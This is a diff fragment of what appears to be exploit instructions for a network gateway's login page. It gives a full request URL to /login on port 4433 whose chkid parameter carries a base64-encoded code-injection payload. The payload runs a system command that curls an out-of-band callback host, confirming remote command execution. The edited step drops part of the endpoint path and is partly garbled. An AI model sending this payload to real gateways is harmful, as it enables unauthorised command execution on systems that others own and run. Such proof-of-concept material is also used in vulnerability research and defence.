@@ -32,7 +32,7 @@ eydzVXNlckNvZGU6J2ltcG9ydCgnc29zJykuc3lzdGVtKCdjdXJsIG5qYWV4cXh0dmZlM2g5djNrNWps
 
 
 Send the Request:
-Send a GET request to the /login?nl.lang=0 endpoint on the target gateway, including the encoded payload in the chkid parameter. 
+Send a GET request to the nl.lang=0&title=1&oip=1&chkid= endpoint on the target gateway, including the encoded payload in the chkid parameter. 
  
 https://<GATEWAY_IP>:4433/login?nl.lang=0&title=1&oip=1&chkid=eydzVXNlckNvZGU6J2ltcG9ydCgnc29zJykuc3lzdGVtKCdjdXJsIG5qYWV4cXh0dmZlM2g5djNrNWpsYWVpMnl1NGtzYmcwLm9hc3RpZnkuY29tJyk=
      
